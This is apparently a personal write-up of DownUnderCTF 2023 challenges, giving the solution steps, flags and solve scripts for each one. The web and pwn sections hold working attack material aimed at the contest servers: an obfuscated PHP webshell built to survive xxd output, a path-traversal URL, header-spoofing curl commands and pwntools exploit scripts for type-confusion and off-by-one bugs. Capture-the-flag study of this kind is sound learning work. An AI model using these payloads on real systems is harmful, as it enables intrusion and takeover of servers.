# DownUnderCTF 2023

## misc
### discord

discord -> rules -> monkey video -> 3:45

![](https://hackmd.io/_uploads/HyU18VJCh.png)

[NATO phonetic alphabet](https://en.wikipedia.org/wiki/NATO_phonetic_alphabet)

`DUCTF{REJECTHUMANITYRETURNTOOURSUPPORTQUEUE}`

### 𝕏

view the yellow piece of flag in memes and concatenate it together

`DUCTF{ThanksEl0nWeCantCall1tTheTw1tterFl4gN0w}`

### blinkybill

audacity -> effect -> delete the unnecessary frequency and listen along with the original sound (superposition principle) to make the morse code more clearer

Also, google auto complete is useful

`DUCTF{BRINGBACKTHETREES}`

### Welcome to DUCTF!

read the program buttom up and collate it with clear version

```
;H┴MƎɹ┴S + ɹnoHʎddɐH + Ⅎ∀˥פ ƎWWIפ	

;„ƎɹƐɥʍƐɯoϛ_ʞɔ0lƆoϛ-sʇƖ„ = ɹnoHʎddɐH NOʞƆƎɹ I 
;„{Ⅎ┴Ɔ∩D„ = Ⅎ∀˥פ NOʞƆƎɹ I
;„}„ = H┴MƎɹ┴S NOʞƆƎɹ I
¡Ǝ┴∀W ⅄∀D,פ
```

[aussie++](https://aussieplusplus.vercel.app/)

`DUCTF{1ts-5oCl0ck_5om3wh3rE}`

### My First C Program!

[DreamBard](https://github.com/TodePond/WhenWillProgrammersStopMakingDecisionsForOurSocietyAndJustLeaveUsAloneAlsoHackerNewsIsAVileWebsite)

`DUCTF{I_D0nT_Th1nk_th15_1s_R34L_C}`

### impossible

Found some interesting pyc in `app/utils/__pycache__`

It is the cache for importing python as library, it may contains old data for last change of library

Read the `crypto.cpython-310.pyc` and found key might be `f122df4b445b2c383ace204f1571e410d7c5061c8852ed0b1f1a5e696aab0bea`

`DUCTF{o0p5_i_f0rG0t_aBoUt_pYc4Ch3!!1!}`

### Survey

Finish teh survey

The most difficult is to regonize the flag inside image

`DUCTF{48_fun_hours_thx_4_playing_DUCTF4}`

### (X) helpless

In the challenge, it modify the shell as python help shell

For python `help`, it can do some RCE trick. [[Ref]](https://zhuanlan.zhihu.com/p/578986988#:~:text=calc_jail_beginner_level3). But in this cnallenge it can not help us.

In the [Official Writeup](https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/beginner/helpless/HINTS.md), there is a hint and suggest us find a features in `less` to read the file.

After reading the manual, I found `:e` can be useful. The full instruction as below.

1. Enter `os` to get into `less` mode
2. Enter `:e` to examine a file
3. Examine `/home/ductf/flag.txt`

`DUCTF{sometimes_less_is_more}`

### (X) Needle In IAM

[writeup](https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/beginner/needle-in-iam/solve/SOLVE.md)

[Install]((https://cloud.google.com/sdk/docs/install-sdk#deb)) gcloud SDK first 

Then `gcloud init` to do the initialize

Add credential file with the following command

```bash
gcloud auth activate-service-account --key-file=credentials.json
```

Then use the following command to list all the project and filter the item contains DUCTF [ref](https://cloud.google.com/sdk/gcloud/reference/iam/roles/list)

```bash
gcloud iam roles list --project=needle-in-iam --filter="desc
ription:DUCTF"
```

`DUCTF{D3scr1be_L1ST_Wh4ts_th3_d1fference_FDyIMbnDmX}`

### (X) pyny

[ref](https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/beginner/pyny/solve/solver.py)

The hardest part is that a leading newline needs to be preserved

:::spoiler solve.py
```python
data = open("pyny.py").read().strip().replace("#coding: punycode","")
print(data.encode().decode("punycode"))
```
:::

`DUCTF{python_warmup}`

### (X) SimpleFTPServer

[writeup](https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/misc/simple-ftp-server/solve/solve.md)

When we connected to the server. It doesn't ask us the credential and we can do many operate to the server.

We can use `LIST` command to do `ls` stuff in ftp first. We can see that there is a `/chal` directory

```
LIST
150 Here comes the directory listing.
drwxr-xr-x 1 user group 4096 Aug 04 02:02 usr
drwxr-xr-x 1 user group 4096 Aug 04 02:06 lib64
drwxr-xr-x 1 user group 4096 Aug 21 01:13 lib
drwxr-xr-x 1 user group 4096 Aug 21 01:14 bin
drwxr-xr-x 1 user group 4096 Aug 21 01:12 kctf
drwxr-xr-x 1 user group 4096 Aug 30 04:23 chal
226 Directory send OK.
```

Then, we can use `CWD` command to change the current directory. Just like `cd` command

```
CWD chal
250 OK.
```

Then we do the `LIST` again

```
LIST
150 Here comes the directory listing.
-rwxr-xr-x 1 user group 7151 Aug 30 04:23 pwn
-rw-r--r-- 1 user group 27 Aug 31 02:14 flag.txt
226 Directory send OK.
```

We found that there is a `flag.txt` file. We can use `RETR` to get the content of the file

```
RETR flag.txt
150 Opening data connection.
226 Transfer complete.
DUCTF{- Actually no, I don't feel like giving that up yet. ;)
```

It don't give use the flag directly. But there is another `pwn` file. It may be the source code / binary of the FTP server

We can observer the source code. It use the python as the FTP server

We can found that it use the function in the class as the FTP command. Also, it read the `flag.txt` into global variable `FLAG`

In the writeup, we can use `__init__` as the ftp command, and it will call the `__init__` function directly. So we can try to call the `__init__.__globals__.get(FLAG)` to get the value of the global variable `FLAG`

```
__init__.__globals__.get FLAG
DUCTF{15_this_4_j41lbr34k?}
```

`DUCTF{15_this_4_j41lbr34k?}`

## osint
### Excellent Vista!

`exiftool -n ExcellentVista.jpg` find GPS location

[google map](https://www.google.com/maps/place/29%C2%B030'34.3%22S+153%C2%B021'34.5%22E/@-29.5095745,153.3590602,20.12z/data=!4m5!3m4!4b1!8m2!3d-29.5095361!4d153.3595722?entry=ttu) found location

`DUCTF{Durrangan_Lookout}`

### Bridget's Back!

Google lens found it is `Golden Gate Bridge`

After looking around, found the most possible place

`DUCTF{H._Dana_Bowers_Rest_Area_&_Vista_Point}`

### faraday

using API and Triangulation (also gussing) to find the location

Melbourne -> Echuca -> Bendigo -> Mount Buller -> Myrtleford -> ... -> Milawa

```jsonld
{
  "device": {
    "phoneNumber": "+61491578888"
  },
  "area": {
    "areaType": "Circle",
    "center": {
      "latitude": -36.44975198876775,
      "longitude": 146.43384597112023
    },
    "radius": 2000
  },
  "maxAge": 120
}
```

`DUCTF{Milawa}`

## blockchain
### Eight Five Four Five

Copy script from [here](https://hackmd.io/@sixkwnp/r1LUpvOuj/https%3A%2F%2Fhackmd.io%2F8RiwjeFzRD-Iyb11kR9__A#Solve-Me) and modify it

:::spoiler solve.js
```javascript
var Web3 = require('web3');
var web3 = new Web3('https://blockchain-eightfivefourfive-80842a1fe7857165-eth.2023.ductf.dev:8545');

var myaddr = "0x7B674911d8d1cc8A958340e898Bd80AFFaB45C07";
var mypriv = "0xcc6c90e0ae1eaa6450f4ec692bce9e15b29ee7392f8b360876bdde33dd87c44d";
var contractaddr = "0xf22cB0Ca047e88AC996c17683Cee290518093574";

const ABI = [
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "some_string",
				"type": "string"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "readTheStringHere",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "answer",
				"type": "string"
			}
		],
		"name": "solve_the_challenge",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "you_solved_it",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

var mycontract = new web3.eth.Contract(ABI, contractaddr);

web3.eth.accounts.wallet.add(mypriv);
mycontract.methods.readTheStringHere().call().then(
    function(result){
        console.log(result);
        mycontract.methods.solve_the_challenge(result).send({from: myaddr, gas: 100000}).then(
            function(result){
                console.log(result);
                mycontract.methods.isSolved().call().then(console.log);
            }
        );
    }
); // 'I can connect to the blockchain!'

// mycontract.methods.isSolved().call().then(console.log);
```
:::

:star: Just remember installing web3@1.18.0 not the latest version

`DUCTF{I_can_connect_to_8545_pretty_epic:)}`

## web
### proxed

add `X-Forwarded-For: 31.33.33.7` in request header

`DUCTF{17_533m5_w3_f0rg07_70_pr0x}`

### static file server

```!
https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/..%2f..%2f..%2f..%2f..%2fflag.txt
```

`DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}`

### xxd-server

It is a upload server, which will xxd the uploaded file and output it

For the xxd functionailty, it will look like original `xxd` command output, but it actually using `sprintf` to do such work. So it may not have a command injection problem

Also, in `.htaccess`, it will force the file output stream become plaintext except `.php`

:::spoiler .htaccess
```nginx
# Everything not a PHP file, should be served as text/plain
<FilesMatch "\.(?!(php)$)([^.]*)$">
    ForceType text/plain
</FilesMatch>
```
:::

So maybe it can upload a php webshell?

For a safety craft php script, it is possible. Here is my script:

:::spoiler solve.php
```php
<?php $a='      ';$b='exec';$a='';$g=$_GET;$a=' ';$b($g["c"]);?>
```
:::

It seems wierd, but when it convert to xxd output, it will become the following:

```=
00000000: 3c3f 7068 7020 2461 3d27 2020 2020 2020  <?php $a='
00000010: 273b 2462 3d27 6578 6563 273b 2461 3d27  ';$b='exec';$a='
00000020: 273b 2467 3d24 5f47 4554 3b24 613d 2720  ';$g=$_GET;$a='
00000030: 273b 2462 2824 675b 2263 225d 293b 3f3e  ';$b($g["c"]);?>
```

for prettier, it will look obviously as a webshell:

```php=
00000000: 3c3f 7068 7020 2461 3d27 2020 2020 2020  
<?php
    $a='
00000010: 273b 2462 3d27 6578 6563 273b 2461 3d27  ';
    $b='exec';
    $a='
00000020: 273b 2467 3d24 5f47 4554 3b24 613d 2720  ';
    $g=$_GET;
    $a='
00000030: 273b 2462 2824 675b 2263 225d 293b 3f3e  ';
    $b($g["c"]);
?>
```

Ignore the `$a` part, it is just a `exec($_GET["c"]);`

But it still a bind webshell, so we can use `cat /flag >> ./solve.php` to dump the flag into file we uploaded

`DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}`

### grades_grades_grades

After observe the source code, found it will store all credential in JWT, and will setup

But, in the signup procedure, it sets all the paylaod into JWT without check. So we can forgery signup packet and add `is_teacher=1` paylaod in it

It will automate generate a JWT with Teacher role, which make us are able to view flag page

`DUCTF{Y0u_Kn0W_M4Ss_A5s1GnM3Nt_c890ne89c3}`

### (X) actually-proxed

[Writeup](https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/web/actually-proxed/solve/solve.sh)

In the source code, it modify the `X-Forwarded-For` header and make it as the real client IP

```go
for i, v := range headers {
    if strings.ToLower(v[0]) == "x-forwarded-for" {
        headers[i][1] = fmt.Sprintf("%s, %s", v[1], clientIP)
        break
    }
}
```

But when `X-Forwarded-For` occur twice, only the first `X-Forwarded-For` been modified. The second one is as same as original. And in the procedure, the second one will cover the first one, which is teh result we want

```bash
curl -v http://actually.proxed.duc.tf:30009 -H "X-Forwarded-For: 31.33.33.7" -H "X-Forwarded-For: 31.33.33.7"
```

`DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}`

## crypto
### complementary

[factordb](http://factordb.com/index.php?query=6954494065942554678316751997792528753841173212407363342283423753536991947310058248515278)

```python
m1 = 1168302403781268101731523384107546514884411261
m2 = num // m1
print(long_to_bytes(m2) + long_to_bytes(m1))
```

`DUCTF{is_1nt3ger_f4ct0r1s4t10n_h4rd?}`

### flag art

find index in palette and do CRT

:::spoiler solve.py
```python
from sage.all import CRT
import string

with open("/home/ywc/myworkspace/ductf_2023/flag_art/output.txt") as fh:
    data = fh.read()

palette = '.=w-o^*'

flag = b""
temp = []
for d in data:
    if d in palette:
        temp.append(palette.find(d))
        if(len(temp) == 4):
            m = CRT(temp, [2,3,5,7])
            if chr(m) not in string.printable:
                m += (2*3*5*7)
            flag += bytes([m])
            temp.clear()
            print(flag)
```
:::


`DUCTF{r3c0nstruct10n_0f_fl4g_fr0m_fl4g_4r7_by_l00kup_t4bl3_0r_ch1n3s3_r3m41nd3r1ng?}`

### randomly chosen

In the source code, it choose a number from 0 to 1337 as the random seed for random

Then, it use `random.choice` to sample the flag string

We can try all the 1338 keys and compare the generated distribution is as same as sampled flag string. If it is same, recover the flag

:::spoiler solve.py
```python
import random

with open("output.txt") as fh:
    data = fh.read().strip()

distribution = []
for seed in range(0, 1338):
    random.seed(seed)
    distribution.append(random.choices(range(0,61), k=61*5))

for i,dist in enumerate(distribution):
    if dist[-1] == 1 and dist[1] == 0:
        origflag = [0 for _ in range(61)]
        for j,d in enumerate(dist):
            origflag[d] = data[j]
        print(''.join(origflag))
```
:::

`DUCTF{is_r4nd0mn3ss_d3t3rm1n1st1c?_cba67ea78f19bcaefd9068f1a}`

### apbq rsa i

It is a RSA challenge, with p,q in 1024 bit length. So it can not easily factorize n.

But it give us some hint. It calculates 2 $hint = a*p+b*q$ value, with a 12 bit length and b 312 bit length

we can find a set of $x_1$, $x_2$ so that $x_1 * a_1 == x_2 * a_x$, which makes $x_1 * hint1 - x_2 * hint2$ = $x_1*a_1*p+x_1*b_1*q - x_2*a_2*p+x_2*b_2*q$ = $(x_1*a_1 - x_2*a_2)*p+(x_1*b_1 - x_2*b_2)*q$ = $(x_1*b_1 - x_2*b_2)*q$

We can perform GCD with this value along with n, and check whether is has a common factor is not 1 and is a prime. This factor might be the $q$

Full script:
:::spoiler solve.py
```python
from Crypto.Util.number import long_to_bytes, GCD, isPrime
from tqdm import trange

n = ...
c = ...
hints = ...

for a in trange(1,2**12):
    for b in range(1,2**12):
        newnum = a*hints[0] - b*hints[1]
        q = GCD(newnum, n)
        if(q != 1 and isPrime(q)):
            q = GCD(newnum, n)
            p = n // q
            assert isPrime(p)
            assert p*q == n
            phi = (p-1)*(q-1)
            d = pow(0x10001,-1,phi)
            print(long_to_bytes(pow(c,d,n)))

```
:::

`DUCTF{gcd_1s_a_g00d_alg0r1thm_f0r_th3_t00lbox}`

## rev
### All Father's Wisdom

found wierd buffer in `main.print_flag`

follow the code to print flag (xor with 0x11 -> fromhex)

[cyberchef](https://gchq.github.io/CyberChef/#recipe=Reverse('Line')Find_/_Replace(%7B'option':'Regex','string':'.*local(.*)%20%3D%200x'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':';%5C%5Cr'%7D,'',true,false,true,false)From_Hex('Auto')XOR(%7B'option':'Hex','string':'11'%7D,'Standard',false)From_Hex('Auto')&input=ICBsb2NhbF84ID0gMHg3NTsNCiAgbG9jYWxfMTAgPSAweDI2Ow0KICBsb2NhbF8xOCA9IDB4MzE7DQogIGxvY2FsXzIwID0gMHgyMjsNCiAgbG9jYWxfMjggPSAweDI1Ow0KICBsb2NhbF8zMCA9IDB4MzE7DQogIGxvY2FsXzM4ID0gMHg3NzsNCiAgbG9jYWxfNDAgPSAweDI0Ow0KICBsb2NhbF80OCA9IDB4MzE7DQogIGxvY2FsXzUwID0gMHgyNTsNCiAgbG9jYWxfNTggPSAweDI2Ow0KICBsb2NhbF82MCA9IDB4MzE7DQogIGxvY2FsXzY4ID0gMHgyMTsNCiAgbG9jYWxfNzAgPSAweDIyOw0KICBsb2NhbF83OCA9IDB4MzE7DQogIGxvY2FsXzgwID0gMHg3NDsNCiAgbG9jYWxfODggPSAweDI1Ow0KICBsb2NhbF85MCA9IDB4MzE7DQogIGxvY2FsXzk4ID0gMHg3NTsNCiAgbG9jYWxfYTAgPSAweDIzOw0KICBsb2NhbF9hOCA9IDB4MzE7DQogIGxvY2FsX2IwID0gMHgyMjsNCiAgbG9jYWxfYjggPSAweDI0Ow0KICBsb2NhbF9jMCA9IDB4MzE7DQogIGxvY2FsX2M4ID0gMHgyMDsNCiAgbG9jYWxfZDAgPSAweDIyOw0KICBsb2NhbF9kOCA9IDB4MzE7DQogIGxvY2FsX2UwID0gMHg3NzsNCiAgbG9jYWxfZTggPSAweDI0Ow0KICBsb2NhbF9mMCA9IDB4MzE7DQogIGxvY2FsX2Y4ID0gMHg3NDsNCiAgbG9jYWxfMTAwID0gMHgyNzsNCiAgbG9jYWxfMTA4ID0gMHgzMTsNCiAgbG9jYWxfMTEwID0gMHgyMDsNCiAgbG9jYWxfMTE4ID0gMHgyMjsNCiAgbG9jYWxfMTIwID0gMHgzMTsNCiAgbG9jYWxfMTI4ID0gMHgyNTsNCiAgbG9jYWxfMTMwID0gMHgyNzsNCiAgbG9jYWxfMTM4ID0gMHgzMTsNCiAgbG9jYWxfMTQwID0gMHg3NzsNCiAgbG9jYWxfMTQ4ID0gMHgyNTsNCiAgbG9jYWxfMTUwID0gMHgzMTsNCiAgbG9jYWxfMTU4ID0gMHg3MzsNCiAgbG9jYWxfMTYwID0gMHgyNjsNCiAgbG9jYWxfMTY4ID0gMHgzMTsNCiAgbG9jYWxfMTcwID0gMHgyNzsNCiAgbG9jYWxfMTc4ID0gMHgyNTsNCiAgbG9jYWxfMTgwID0gMHgzMTsNCiAgbG9jYWxfMTg4ID0gMHgyNTsNCiAgbG9jYWxfMTkwID0gMHgyNDsNCiAgbG9jYWxfMTk4ID0gMHgzMTsNCiAgbG9jYWxfMWEwID0gMHgyMjsNCiAgbG9jYWxfMWE4ID0gMHgyNTsNCiAgbG9jYWxfMWIwID0gMHgzMTsNCiAgbG9jYWxfMWI4ID0gMHgyNDsNCiAgbG9jYWxfMWMwID0gMHgyNDsNCiAgbG9jYWxfMWM4ID0gMHgzMTsNCiAgbG9jYWxfMWQwID0gMHgyNTsNCiAgbG9jYWxfMWQ4ID0gMHgyNTsN)

`DUCTF{Od1n_1S-N0t_C}`

### the bridgekeepers 3rd question

Found the following js in `text/javascript` (seen in source)

Just make it return `blue`, just as find a way from `a` -> `b` -> ... -> `n`

:::spoiler javascript
```javascript
let answer = fun(x);
  
  if (!/^[a-z]{13}$/.exec(answer)) return "";

  let a = [], b = [], c = [], d = [], e = [], f = [], g = [], h = [], i = [], j = [], k = [], l = [], m = [];
  let n = "blue";
  a.push(a, a, a, a, a, a, a, a, a, a, a, a, a, a, a, a, a, b, a, a, a, a, a, a, a, a);
  b.push(b, b, b, b, c, b, a, a, b, b, a, b, a, b, a, a, b, a, b, a, a, b, a, b, a, b);
  c.push(a, d, b, c, a, a, a, c, b, b, b, a, b, c, a, b, b, a, c, c, b, a, b, a, c, c);
  d.push(c, d, c, c, e, d, d, c, c, c, c, b, c, c, d, c, b, d, a, d, c, c, c, a, d, c);
  e.push(a, e, f, c, d, e, a, e, c, d, c, c, c, d, a, e, b, b, a, d, c, e, b, b, a, a);
  f.push(f, d, g, e, d, e, d, c, b, f, f, f, a, f, e, f, f, d, a, b, b, b, f, f, a, f);
  g.push(h, a, c, c, g, c, b, a, g, e, e, c, g, e, g, g, b, d, b, b, c, c, d, e, b, f);
  h.push(c, d, a, e, c, b, f, c, a, e, a, b, a, g, e, i, g, e, g, h, d, b, a, e, c, b);
  i.push(h, a, d, b, d, c, d, b, f, a, b, b, i, d, g, a, a, a, h, i, j, c, e, f, d, d);
  j.push(b, f, c, f, i, c, b, b, c, j, i, e, e, j, g, j, c, k, c, i, h, g, g, g, a, d);
  k.push(i, k, c, h, h, j, c, e, a, f, f, h, e, g, c, l, c, a, e, f, d, c, f, f, a, h);
  l.push(j, k, j, a, a, i, i, c, d, c, a, m, a, g, f, j, j, k, d, g, l, f, i, b, f, l);
  m.push(c, c, e, g, n, a, g, k, m, a, h, h, l, d, d, g, b, h, d, h, e, l, k, h, k, f);

  walk = a;

  for (let c of answer) {
    walk = walk[c.charCodeAt() - 97];
  }

  if (walk != "blue") return "";

  return {toString: () => _ = window._ ? answer : "blue"};
```
:::



The answer is `rebeccapurple`

`DUCTF{rebeccapurple}`

## pwn
### downunderflow

Because of type incompatable between idx (unsigned short) and return of read_int_lower_than function (int), so it will have some vulnerability

Login id with `-65529`

`DUCTF{-65529_==_7_(mod_65536)}`

### confusing

Type confusing and out-of-bound write trick

For the `scanf("%lf", &d);`, it can entering `1.39067116130910353795872316474E-309`, which is `0x0000FFFFFFFF3419`, can make d become `0x3419` and make z become `-1` (0xffffffff)

For the `scanf("%d", &s);`, it can entering `1195461702`, which is `0x47414c46` and it is `FLAG` in little endian

For the `scanf("%8s", &f);`, it can entering the byte string of `0xe586949b77e3f93f`, which will become 1.6180339887 in IEEE754 (in little endian)

Full script:

:::spoiler solve.py
```python
from pwn import *
from Crypto.Util.number import long_to_bytes
binary = "./confusing"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("2023.ductf.dev", 30024)
# conn = process(binary)
# conn = gdb.debug(binary)

# 0x0000FFFFFFFF3419
# 0x47414c46
# 0xe586949b77e3f93f
conn.sendlineafter(b"d: ", b"1.39067116130910353795872316474E-309")
conn.sendlineafter(b"s: ", str(0x47414c46).encode())
conn.sendlineafter(b"f: ", long_to_bytes(0xe586949b77e3f93f))
conn.interactive()
```
:::

`DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}`

### (X) one byte

This is an off-by-one attack [ref](https://www.anquanke.com/post/id/183873)

We can modify the last byte as a randomly number. And hope the control flow jump on the stack. We can fill in the address we want (`win` function)

So we will try again and again to get the hope. [ref](https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/beginner/one-byte/solve/solv.py)

Although it has PIE defense, it may leak the `init` address. We can calculate the `win` address with the `init` address leak, which is `win = leak - 0x1bd + 0x203`

:::spoiler solve.py
```python
from pwn import *
from Crypto.Util.number import bytes_to_long
binary = "./onebyte"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

while True:
    conn = remote("2023.ductf.dev", 30018)
    # conn = process(binary)
    # conn = gdb.debug(binary, "b main")

    conn.recvuntil(b"0x")
    d = conn.recv(8)
    leak = bytes_to_long(bytes.fromhex(d.decode()))

    print(d)
    win = leak + (0x203 - 0x1bd)
    print(hex(win))
    conn.sendafter(b"Your turn: ", p32(win) * 4 + b"x")
    conn.sendline(b'whoami')
    try:
        result = conn.recvline().decode()
        print(result)
        conn.interactive()
        conn.close()
        exit()
    except EOFError:
        conn.close()
```
:::

`DUCTF{all_1t_t4k3s_is_0n3!}`